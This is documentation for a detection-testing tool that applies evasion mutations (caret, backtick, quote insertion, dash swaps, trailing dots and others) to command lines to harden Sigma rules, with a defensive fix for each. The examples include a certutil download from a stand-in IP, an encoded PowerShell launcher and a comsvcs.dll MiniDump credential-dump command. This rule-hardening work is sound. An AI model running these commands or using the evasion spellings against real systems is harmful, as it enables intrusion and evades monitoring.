# Mutators

The mutation catalog is the reason Ordeal exists. A unit test asks whether a rule
fires on an event. A mutator asks the adversary's question: what is the cheapest
change to that event that keeps the behavior identical but stops the rule from
firing?

List the catalog at any time:

```bash
ordeal list mutators
```

```
NAME                TECHNIQUE                 DESCRIPTION
flag-abbreviation   T1059.001                 Shorten PowerShell/cmd flags to an accepted prefix (-EncodedCommand -> -enc)
windash             Sigma windash             Swap the - flag prefix for an accepted alternative (/, en-dash, em-dash)
caret-insertion     T1027                     Insert cmd.exe caret escapes into the command token (whoami -> who^ami)
powershell-tick     T1059.001                 Insert PowerShell backtick escapes into the command token (iex -> i`ex)
quote-insertion     T1027                     Insert empty quote pairs into the command token (powershell -> pow""ershell)
env-indirection     T1027                     Replace an absolute path prefix with an environment variable (C:\Windows -> %SystemRoot%)
forward-slash-path  T1027                     Flip \ path separators to / (C:\Windows -> C:/Windows)
trailing-dot        T1036                     Append a trailing dot to an executable name (certutil.exe -> certutil.exe.)
whitespace-padding  T1027                     Expand single spaces into runs (arg1 arg2 -> arg1   arg2)
case-flip           backend case-sensitivity  Invert letter case of non-payload tokens (powershell -> POWERSHELL)
```

<!-- ------------------------------------------------------------ -->

## The Semantics-Preserving Principle

Every mutator obeys one rule: **the mutated command must do the same thing on the
host.** Only its surface form may change. `-enc` and `-EncodedCommand` start the
same PowerShell process. `who^ami` and `whoami` produce the same output. A
mutation that changes behavior is a false finding — it proves nothing about the
rule, because no operator would ever run it.

That constraint is what makes an Ordeal finding actionable. When a mutation
evades a rule, there is no argument to have about whether the variant is
realistic. It is the same attack, written differently, and the rule missed it.

Two further constraints keep findings honest rather than merely numerous.

### Only Attacker-Controlled Fields Are Mutated

Fields are classified by name before anything is attacked:

| Class | Fields | Mutated |
| --- | --- | --- |
| Command | `CommandLine`, `ParentCommandLine`, `cmdline`, `Arguments`, `args`, `ScriptBlockText` | Yes |
| Path | `Image`, `ParentImage`, `TargetFilename`, `*path*`, `*directory*` | No |
| Generic | Everything else — hashes, ports, users, event IDs | No |

Command text reflects attacker input verbatim: whatever the operator typed is
what lands in the log. An image path does not. The kernel resolves it and logs
the canonical form regardless of how the process was launched, so mutating
`Image` would model an evasion that cannot happen in production and report a gap
that is not there.

Classification is by name substring, so a source-specific field such as
`process_command_line` is still recognized as command text. If your telemetry
uses a name the heuristic misses, map it with a `config:` in the suite — see
[test-format.md](test-format.md).

### Payload Tokens Are Never Corrupted

A long base64 or hex token is an encoded payload, not a word. Inserting a caret
into it or flipping its case changes what executes, so the token-level and
case-level mutators leave those tokens alone:

```
powershell.exe -enc JABjAGwAaQBlAG4AdAA9AA==
POWERSHELL.EXE -ENC JABjAGwAaQBlAG4AdAA9AA==
```

The command word and the flags flip. The payload does not.

### Scope of a Variant

Each variant changes exactly one field, and the rest of the event is copied
unchanged. That isolation is what lets the report name a single cause for each
evasion. Mutators generate; they never evaluate. The runner compiles the rule
once and tests each variant against it.

### Selecting Mutators

Run a subset when you are working a specific gap:

```bash
ordeal mutate ./rules --only windash,flag-abbreviation
ordeal mutate ./rules --skip case-flip
```

<!-- ------------------------------------------------------------ -->

## flag-abbreviation

Shortens a well-known interpreter flag to the shortest prefix the parser still
accepts.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
powershell.exe -NoProfile -enc SQBFAFgA
```

**Technique.** PowerShell resolves any unambiguous parameter prefix, so
`-EncodedCommand`, `-EncodedComm`, and `-enc` are the same parameter. The
abbreviations are not obscure — `-nop -w hidden -enc` is the canonical launcher
string in commodity tooling and in nearly every public C2 profile. A rule that
matches the long form literally misses all of them.

Ordeal abbreviates `-EncodedCommand`, `-ExecutionPolicy`, `-NoProfile`,
`-WindowStyle`, `-NonInteractive`, `-Command`, `-File`, `-Version`, and `-NoLogo`,
emitting one variant per flag it finds, in sorted order.

**Anchor.** `T1059.001`. MITRE ATT&CK [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
and [T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/).
See also ArgFuscator's PowerShell profile.

**Fix.** Match on the encoded payload's shape rather than the full flag name.
`|contains: ' -e'` paired with a base64 pattern covers every abbreviation; a
`|contains|all` list enumerating the accepted short forms covers it explicitly.

<!-- ------------------------------------------------------------ -->

## windash

Replaces the ASCII hyphen flag prefix with an alternative character the Windows
argument parser accepts.

```
certutil.exe -urlcache -split -f http://198.51.100.10/a.exe a.exe
certutil.exe /urlcache /split /f http://198.51.100.10/a.exe a.exe
certutil.exe –urlcache –split –f http://198.51.100.10/a.exe a.exe
certutil.exe —urlcache —split —f http://198.51.100.10/a.exe a.exe
```

**Technique.** Many Windows binaries accept `/flag` and `-flag` interchangeably,
and several interpreters also accept the Unicode en-dash (`–`, U+2013) and em-dash
(`—`, U+2014) as a flag prefix. Ordeal emits all three. This is the evasion
SigmaHQ considered common enough to put into the specification, and it is the one
that most often breaks an otherwise well-written rule.

**Anchor.** The Sigma [`|windash` value modifier](https://sigmahq.io/docs/basics/modifiers.html);
MITRE ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/).

**Fix.** Enumerate the accepted prefixes in the value list:

```yaml
  CommandLine|contains:
    - '-urlcache'
    - '/urlcache'
    - '–urlcache'      # en-dash
    - '—urlcache'      # em-dash
```

Sigma's `|windash` modifier performs that expansion at compile time and is the
right thing to write for a rule bound for SigmaHQ. Ordeal's evaluator
(`bradleyjkemp/sigma-go`) does not implement it yet — a rule using it fails to
evaluate with `unknown modifier windash` — so enumerate the values for local
testing until it lands.

<!-- ------------------------------------------------------------ -->

## caret-insertion

Inserts cmd.exe's escape character into the command token.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
power^shell.exe -NoProfile -EncodedCommand SQBFAFgA
```

**Technique.** `^` is the cmd.exe escape character. The parser consumes it and
passes the remaining characters to the process, so `who^ami` executes `whoami`.
The caret can be placed between any two characters, which gives an attacker an
enormous number of equivalent spellings of the same command word for free.

Ordeal carets the command token — the first whitespace-delimited token — and
leaves the arguments intact. That is the placement that defeats a rule keyed on
the binary name, and it cannot damage an argument payload.

**Anchor.** `T1027`. MITRE ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/);
Invoke-DOSfuscation (Daniel Bohannon), `TOKEN` and `CMD` obfuscation classes.

**Fix.** Do not identify a process by a substring of its command word when that
word can be carated. Anchor on `Image`, `OriginalFileName`, parent process, or
image hash — all resolved by the kernel and immune to command-line escaping.

<!-- ------------------------------------------------------------ -->

## powershell-tick

Inserts PowerShell's backtick escape into the command token.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
power`shell.exe -NoProfile -EncodedCommand SQBFAFgA
```

**Technique.** The backtick is PowerShell's escape character, and before an
ordinary character it is a no-op — the parser drops it and runs the rest:

```
i`ex          runs iex
p`o`w`ershell runs powershell
```

It is the PowerShell counterpart to the cmd caret, and it applies in contexts
where `^` does not — inside a script block, a `-Command` argument, or anything a
PowerShell parser reads rather than cmd.

Kept separate from `caret-insertion` because the two model different parsers and
a rule can be vulnerable to one and not the other.

**Anchor.** `T1059.001`. MITRE ATT&CK [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/);
Invoke-Obfuscation token-level string manipulation.

**Fix.** As for `caret-insertion` — move the identifying signal off the raw
command word. For script-block telemetry, prefer behavioral selections (the API
called, the URI fetched) over the name of the cmdlet.

<!-- ------------------------------------------------------------ -->

## quote-insertion

Inserts empty double-quote pairs into the command token.

```
powershell.exe -NoProfile -EncodedCommand SQBFAFgA
pow""ershell.exe -NoProfile -EncodedCommand SQBFAFgA
```

**Technique.** Both cmd.exe and PowerShell strip quote characters during argument
parsing, so `pow""ershell` resolves to `powershell`. Like the caret, the insertion
point is arbitrary and costs the attacker nothing. Unlike the caret, it survives
contexts where `^` is consumed by an outer parser.

**Anchor.** `T1027`. MITRE ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/);
Invoke-DOSfuscation token-layer obfuscation.

**Fix.** Same as `caret-insertion` and `powershell-tick`. Three mutators, one
underlying weakness: a rule that identifies a binary by a substring of the typed
command word.

<!-- ------------------------------------------------------------ -->

## env-indirection

Replaces a well-known absolute path prefix in the command line with the
equivalent environment variable.

```
cmd.exe /c C:\Windows\System32\certutil.exe -urlcache -f http://198.51.100.10/a.exe
cmd.exe /c %SystemRoot%\System32\certutil.exe -urlcache -f http://198.51.100.10/a.exe
```

**Technique.** `%SystemRoot%\System32\cmd.exe` and `C:\Windows\System32\cmd.exe`
name the same file. The shell expands the variable before execution, so the
process starts identically while the logged command line differs. Ordeal
substitutes `C:\Windows\System32`, `C:\Windows`, `C:\Program Files`, and
`C:\Users`, emitting one variant per prefix it finds.

Variable expansion is also chainable in ways Ordeal does not model —
`%SystemRoot:~0,1%` and similar substring tricks reconstruct a path character by
character. Treat a finding here as the cheap end of a large family.

**Anchor.** `T1027`. MITRE ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/);
LOLBAS invocation notes, which routinely list the `%SystemRoot%` form alongside
the literal path.

**Fix.** Do not pin a full literal path in a command-line match. Match the file
name alone, and put the location requirement on `Image` — a field an attacker
cannot rewrite.

<!-- ------------------------------------------------------------ -->

## forward-slash-path

Flips Windows backslash path separators in the command line to forward slashes.

```
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump
rundll32.exe C:/Windows/System32/comsvcs.dll,MiniDump
```

**Technique.** The Win32 path layer accepts `/` as a separator in most API calls,
and many interpreters and LOLBins pass the path through unchanged. A rule keyed on
`\comsvcs.dll` misses `/comsvcs.dll` entirely, because the separator is part of
the matched literal.

**Anchor.** `T1027`. MITRE ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/);
Windows path normalization as documented in the Win32 file path reference.

**Fix.** End the literal at the file name — `comsvcs.dll`, not `\comsvcs.dll`.
Where the directory genuinely matters, cover both separators, or move the
requirement to `Image`.

<!-- ------------------------------------------------------------ -->

## trailing-dot

Appends a trailing dot to each executable name in the command line.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe
certutil.exe. -urlcache -f http://198.51.100.10/a.exe.
```

**Technique.** Windows strips trailing dots and spaces during path
canonicalization, so `certutil.exe.` opens `certutil.exe`. The extra character
defeats an exact match and, critically, defeats `|endswith` — the most common way
a Sigma rule pins an executable name.

**Anchor.** `T1036`. MITRE ATT&CK [T1036 — Masquerading](https://attack.mitre.org/techniques/T1036/)
and [T1027](https://attack.mitre.org/techniques/T1027/); Windows path
canonicalization rules.

**Fix.** Use `|contains: 'certutil'` rather than `|endswith: 'certutil.exe'` in
command-line matches, and identify the binary on `Image` or `OriginalFileName`,
which carries the PE resource name and is unaffected by how the path was typed.

<!-- ------------------------------------------------------------ -->

## whitespace-padding

Expands single spaces between arguments into runs of spaces.

```
certutil.exe -urlcache -f http://198.51.100.10/a.exe
certutil.exe   -urlcache   -f   http://198.51.100.10/a.exe
```

**Technique.** Argument parsers collapse repeated whitespace, so the padded
command runs unchanged. A rule matching a literal substring that spans a space —
`|contains: 'certutil -urlcache'` — no longer matches once the gap widens. Tabs
and other separators behave the same way; padding is the cheapest demonstration.

**Anchor.** `T1027`. MITRE ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/);
Invoke-DOSfuscation whitespace obfuscation.

**Fix.** Never span a space in a single literal. Split the condition into separate
`|contains` values combined with `|all`, so each token matches independently of
the spacing between them.

<!-- ------------------------------------------------------------ -->

## case-flip

Inverts the case of every non-payload token.

```
powershell.exe -enc JABjAGwAaQBlAG4AdAA9AA==
POWERSHELL.EXE -ENC JABjAGwAaQBlAG4AdAA9AA==
```

**Technique.** The Sigma specification is case-insensitive, so a correct native
evaluator ignores this mutation and the rule holds. That is the point. Rules are
not run by the reference evaluator in production — they are converted to Elastic
ES|QL, Splunk SPL, Sentinel KQL, or SQL, and several of those backends are
case-sensitive by default for the operators a converted rule uses. A case-flip
finding means the rule is at risk of silently missing the event once deployed,
even though it passes every local test.

Encoded payload tokens keep their original case, because flipping a base64 blob
would change what executes.

**Anchor.** Backend case-sensitivity, not an ATT&CK technique. The Sigma
specification's case-insensitivity requirement, and known divergence between
pysigma conversion targets.

**Fix.** Verify the conversion target's matching semantics. Where the backend is
case-sensitive, normalize the field at ingest or apply the backend's
case-insensitive operator in the pipeline config. Nothing in the rule text fixes
this.

<!-- ------------------------------------------------------------ -->

## How Scoring Works

For each positive case, Ordeal first confirms the rule fires on the unmodified
event. If it does not, the case is reported `SKIP` — mutation against a rule that
never fired is meaningless, and `ordeal run` already flags that as a failure.

It then generates every applicable variant, tests each one, and counts:

- **Attempted** — variants generated across the event's command fields.
- **Survived** — variants the rule still matched.
- **Evaded** — variants the rule missed, each reported with the mutator, the
  field, the note, and the resulting value.

The score is `survived / attempted`, printed as `survives X/N evasions (P%)`.

```
BREACH  powershell encoded command fires  survives 7/11 evasions (64%)
        ▲ flag-abbreviation · CommandLine · abbreviated -encodedcommand to -enc
          powershell.exe -NoProfile -enc SQBFAFgA
        ▲ windash · CommandLine · replaced - flag prefix with forward slash
          powershell.exe /NoProfile /EncodedCommand SQBFAFgA

EVADED  1 detections tested, 4 evasions found
```

A **lower score means a more evadable rule**. `100%` means nothing in the catalog
slipped past this case. Any evasion at all exits `1`.

The denominator is not a constant. It depends on how many command fields the case
declares and how many mutators apply to their values — a case whose command line
has no flags generates no `windash` variants at all. Compare a case against itself
across commits, not against a different case.

Only positive inline cases are scored. Negative cases have nothing to evade, and
dataset cases cover many events rather than one known-good positive.

The catalog is a floor, not a ceiling. Surviving every mutator means the rule
resists the documented techniques Ordeal knows about today; it does not mean the
rule is unevadable. New mutators land through the process in
[CONTRIBUTING.md](../CONTRIBUTING.md) — each one needs a technique citation, a
test that proves the transform, and a test that proves it is a no-op when the
technique does not apply.

---

<sub>Built by <a href="https://principlebreach.com">Principle Breach</a> — offensive security research.</sub>
